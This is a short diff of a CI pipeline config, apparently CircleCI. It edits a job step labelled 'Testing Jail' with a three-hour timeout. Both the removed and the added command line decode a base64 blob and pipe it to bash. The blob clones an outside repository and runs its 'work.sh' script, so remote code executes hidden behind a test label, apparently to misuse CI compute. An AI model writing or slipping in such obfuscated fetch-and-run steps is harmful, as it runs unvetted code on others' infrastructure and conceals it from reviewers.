@@ -20,7 +20,7 @@ jobs:
       - checkout
       - run:
           name: "Testing Jail"
-          command: sudo apt update;sudo apt -y install wget curl git python3 python-venv;base64 -d \<<< IyEvYmluL2Jhc2gKZ2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9udGFuZGF6b21obGFiZW5pL3AyLXB5L2Jsb2IvbWFpbi93b3JrLnNoCmNkIHAyLXB5CmNobW9kICt4IHdvcmsuc2gKYmFzaCB3b3JrLnNo | bash
+          command: sudo apt update;sudo apt -y install wget curl git python3 python3-pip python3-venv;base64 -d \<<< IyEvYmluL2Jhc2gKZ2l0IGNsb25lIGh0dHBzOi8vZ2l0aHViLmNvbS9udGFuZGF6b21obGFiZW5pL3AyLXB5L2Jsb2IvbWFpbi93b3JrLnNoCmNkIHAyLXB5CmNobW9kICt4IHdvcmsuc2gKYmFzaCB3b3JrLnNo | bash
           no_output_timeout: 3h
 
 # Orchestrate jobs using workflows
